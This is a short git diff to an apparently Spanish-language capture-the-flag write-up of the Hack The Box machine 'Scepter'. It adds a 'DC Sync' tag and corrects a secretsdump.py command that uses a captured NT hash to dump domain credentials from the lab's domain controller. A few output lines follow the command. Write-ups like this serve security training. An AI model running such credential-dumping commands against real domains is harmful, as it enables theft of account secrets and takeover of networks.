@@ -15,6 +15,7 @@ tags:
   - "GenericAll"
   - "PassTheCertificate"
   - "ESC14"
+  - "DC Sync"
 categories:
   - writeup
   - hacking
@@ -870,7 +871,7 @@ Ya con la capacidad de autenticarnos como `p.adams`, podemos realizar un ataque 
 {: .notice--info}
 
 ~~~ bash
-secretsdump.py scepter.htb/p.adams@dc01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -just-d c -dc-ip 10.10.11.65
+secretsdump.py scepter.htb/p.adams@dc01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -just-dc -dc-ip 10.10.11.65
 Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
